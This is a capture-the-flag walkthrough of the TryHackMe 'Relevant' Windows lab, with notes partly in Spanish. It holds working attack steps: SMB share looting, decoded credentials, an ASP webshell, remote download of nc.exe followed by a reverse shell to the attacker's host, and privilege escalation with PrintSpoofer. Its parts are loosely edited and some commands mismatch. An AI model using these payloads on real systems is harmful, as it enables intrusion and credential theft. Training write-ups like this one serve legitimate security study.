# Relevant  TryHackMe Writeup

**Target:** `TARGET_IP`
**OS:** Windows Server 2016 Standard
**Difficulty:** Medium
**Tech stack:** IIS 10.0 (×2 ports  `:80` + `:49663`), SMB (writable share), RDP, MSRPC
**Exploit chain:** SMB guest enum ? `nt4wrksv` (R/W) ? `passwords.txt` base64-decoded creds ? upload `.asp` webshell via SMB ? IIS `:49663` executes it ? stage `nc.exe` ? reverse shell as `iis apppool\defaultapppool` / `Bob`

---

## Attack Chain Overview

```
nmap ? 80, 135, 139, 445, 3389, 49663, 49666, 49667
        ?
netexec smb -u guest --shares ? nt4wrksv (READ,WRITE)
        ?
smbclient //$TARGET/nt4wrksv -N ? get passwords.txt
        ?
base64 -d ? Bob:!P@$$W0rD!123, Bill:Juw4nnaM4n420696969!$$$
        ?
smbclient -U 'Bob%!P@$$W0rD!123' -c "put shell.asp"
        ?
http://$TARGET:49663/nt4wrksv/shell.asp?cmd=whoami
        ?
powershell IWR nc.exe ? C:\Windows\Temp\nc.exe ? reverse shell
        ?
user.txt at C:\Users\Bob\Desktop\user.txt
```

---

## Table of Contents
1. [Reconnaissance](#1-reconnaissance)
2. [SMB Enumeration  Writable Share + Encoded Creds](#2-smb-enumeration--writable-share--encoded-creds)
3. [Initial Access  ASP Webshell via SMB ? IIS](#3-initial-access--asp-webshell-via-smb--iis)
4. [Reverse Shell  Stage `nc.exe`](#4-reverse-shell--stage-ncexe)
5. [User Flag](#5-user-flag)
6. [Key Takeaways](#6-key-takeaways)

---

## 1. Reconnaissance

```bash
# What it does: runs an Nmap scan with the specified ports/scripts/options.
# Why here: identify exposed services and decide on the next enumeration.
nmap -sS -p- -n -Pn --min-rate 5000 $TARGET --open -oN silent
nmap -sVC -p80,135,139,445,3389,49663,49666,49667 $TARGET -oN service
```

| Port | Service |
|------|---------|
| 80/tcp | IIS 10.0 |
| 135/tcp | MSRPC |
| 139, 445/tcp | SMB (Server 2016 Standard) |
| 3389/tcp | RDP |
| 49663/tcp | **IIS 10.0  second instance** |
| 49666, 49667/tcp | Dynamic RPC |

Two IIS instances. The second one (`:49663`) is what eventually executes the webshell. See [nmap.md](../../tools/recon/nmap.md).

---

## 2. SMB Enumeration  Writable Share + Encoded Creds

Full technique: [smb-anonymous-enum.md](../../exploits/ad/smb-anonymous-enum.md), [base64-encoded-credentials.md](../../exploits/creds/base64-encoded-credentials.md).

### 2a. Find the writable share

```bash
# What it does: enumerates or authenticates against Windows/AD services.
# Why here: validar acceso, shares, usuarios o politicas.
netexec smb $TARGET -u 'guest' -p '' --shares
# nt4wrksv  READ,WRITE
```

### 2b. Pull the credential file

```bash
# What it does: connects to an SMB resource and optionally executes an action.
# Why here: listar, descargar o subir archivos por SMB.
smbclient //$TARGET/nt4wrksv -N -c "get passwords.txt"
# What it does: displays a file in the terminal.
# Why here: read configuration, credentials, proof or flags.
cat passwords.txt
# [User Passwords - Encoded]
# Qm9iIC0gIVBAJCRXMHJEITEyMw==
# QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

### 2c. Decode

```bash
# What it does: decodes or encodes Base64 data.
# Why here: convertir loot codificado en texto utilizable.
echo Qm9iIC0gIVBAJCRXMHJEITEyMw== | base64 -d
# Bob - !P@$$W0rD!123
echo QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk | base64 -d
# Bill - Juw4nnaM4n420696969!$$$
```

Tools: [netexec](../../tools/recon/netexec.md), [smbclient](../../tools/recon/smbclient.md).

---

## 3. Initial Access  ASP Webshell via SMB ? IIS

Full technique: [smb-write-iis-execution.md](../../exploits/web-rce/smb-write-iis-execution.md).

The `nt4wrksv` share is mirrored at `http://$TARGET:49663/nt4wrksv/`. Files dropped via SMB execute as ASP/ASPX over IIS.

### 3a. Build a classic ASP shell

```asp
<%
Set objShell = CreateObject("WScript.Shell")
Set objCmd = objShell.Exec("cmd /c " & Request.QueryString("cmd"))
Response.Write(objCmd.StdOut.ReadAll())
%>
```

### 3b. Upload via SMB

```bash
# What it does: connects to an SMB resource and optionally executes an action.
# Why here: listar, descargar o subir archivos por SMB.
smbclient //$TARGET/nt4wrksv -U 'Bob%!P@$$W0rD!123' -c "put shell.asp"
```

### 3c. Trigger over HTTP

```bash
# What it does: sends an HTTP request with the chosen method, headers or body.
# Why here: test or trigger the web behavior described in this step.
curl "http://$TARGET:49663/nt4wrksv/shell.asp?cmd=whoami"
# iis apppool\defaultapppool
```

---

## 4. Reverse Shell  Stage `nc.exe`

```bash
# Attacker
# What it does: copies or moves a file.
# Why here: prepare payloads or place loot where the next command expects it.
cp /usr/share/windows-binaries/nc.exe .
# What it does: executes or compiles the script/program with the specified arguments.
# Why here: launch the necessary exploit or helper in this phase.
python3 -m http.server 80
# What it does: opens or uses a TCP connection/listener.
# Why here: receive shell, transfer data or check connectivity.
nc -lvnp 4444
```

Pull `nc.exe` to `C:\Windows\Temp\` via the webshell, then trigger:

```bash
# What it does: sends an HTTP request with the chosen method, headers or body.
# Why here: test or trigger the web behavior described in this step.
curl -G "http://$TARGET:49663/nt4wrksv/shell.asp" \
  --data-urlencode "cmd=powershell -c \"Invoke-WebRequest http://$LHOST/nc.exe -OutFile C:\\Windows\\Temp\\nc.exe\""

curl -G "http://$TARGET:49663/nt4wrksv/shell.asp" \
  --data-urlencode "cmd=dir C:\\Windows\\Temp\\nc.exe"

curl -G "http://$TARGET:49663/nt4wrksv/shell.asp" \
  --data-urlencode "cmd=C:\\Windows\\Temp\\nc.exe $LHOST 4444 -e cmd.exe"
```

`-G --data-urlencode` is mandatory  the spaces, quotes and `\` inside the cmd would otherwise corrupt the URL.

Tools: [netcat](../../tools/pivot/netcat.md), [curl](../../tools/web/curl.md).

---

## 5. User Flag

```cmd
REM What it does: execute a Windows command-line action.
REM Why here: enumerate, transfer, replace or validate artifacts on the victim.
whoami
type C:\Users\Bob\Desktop\user.txt
```

---

## 6. Vamos a pasar winepeas para ver posibles metodos de escalar privilegios

powershell -c "Invoke-WebRequest http://192.168.160.214:8080/winPEAS.ps1 -OutFile C:\Windows\Temp\winPEAS.ps1"

powershell -c "powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\winPEASAny.exe"
                                                                                                                                                                                                                        
=========|| Checking for SNMP Passwords
SNMP Key found at HKLM:\SYSTEM\CurrentControlSet\Services\SNMP

## Vemos un path sin comillas puede ser vulnerable a Unquoted Service Path attack.
Name: AWSLiteAgent 
PathName: C:\Program Files\Amazon\XenTools\LiteAgent.exe

## Tenemos permiso de SeImpersonatePrivilege Impersonate a client after authentication Enabled 
```cmd
Descargar prinspoofer
REM What it does: execute a PowerShell command on Windows.
REM Why here: download, execute or enumerate from the Windows foothold.
powershell -c "Invoke-WebRequest http://192.168.160.214/PrintSpoofer64.exe -OutFile C:\Windows\Temp\ps.exe"

:: Ejecutar  te da SYSTEM directamente
REM What it does: executes a Windows binary by absolute path.
REM Why here: disparar el payload que se ha subido a la victima.
C:\Windows\Temp\ps.exe -i -c cmd
```

## Tenemos acesso commo administrador
```cmd
REM What it does: execute a Windows command-line action.
REM Why here: enumerate, transfer, replace or validate artifacts on the victim.
whoami
## nt authority\system
C:\Users\Administrator\Desktop>type root.txt
```

---

## Related Notes
- [smb-anonymous-enum.md](../../exploits/ad/smb-anonymous-enum.md)  finding the share
- [base64-encoded-credentials.md](../../exploits/creds/base64-encoded-credentials.md)  decoding the credential file
- [smb-write-iis-execution.md](../../exploits/web-rce/smb-write-iis-execution.md)  full ASP/IIS chain
- [windows-enumeration.md](../../exploits/enumeration/windows-enumeration.md)  what to do once you land the shell
- [nmap](../../tools/recon/nmap.md), [netexec](../../tools/recon/netexec.md), [smbclient](../../tools/recon/smbclient.md), [netcat](../../tools/pivot/netcat.md), [curl](../../tools/web/curl.md)


